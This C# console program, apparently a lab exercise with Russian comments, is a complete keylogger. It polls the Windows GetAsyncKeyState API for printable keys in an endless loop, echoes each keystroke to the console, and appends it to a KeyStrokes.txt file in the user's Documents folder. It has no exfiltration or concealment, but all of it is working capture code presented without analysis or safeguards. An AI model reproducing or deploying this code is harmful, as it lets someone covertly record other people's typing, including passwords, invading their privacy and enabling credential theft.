using System;
using System.Text;
using System.Runtime.InteropServices;
using System.Threading;
using System.IO;

namespace LR_4
{
    class Program
    {
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        //строка для хранения всех клавиш

        static string kelLog = "";
        static void Main(string[] args)
        {

            string filepath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);

            if (!Directory.Exists(filepath))
            {
                Directory.CreateDirectory(filepath);
            }

            string path = (filepath + @"\KeyStrokes.txt");

            if(!File.Exists(path))
            {
                using (StreamWriter sw = File.CreateText(path))
                {

                }
            }

            while (true)
            {
                Thread.Sleep(5);

                //проверить все ключи для их состояния

                for (int i = 32; i < 127; i++)
                {
                    int keyState = GetAsyncKeyState(i);

                    if (keyState == 32769)
                    {
                        Console.Write((char)i + ", ");

                        using (StreamWriter sw = File.AppendText(path))
                        {
                            sw.Write((char)i);
                        }
                        //сохранить в текстовый файл
                    }

                }
            }
        }
    }
}
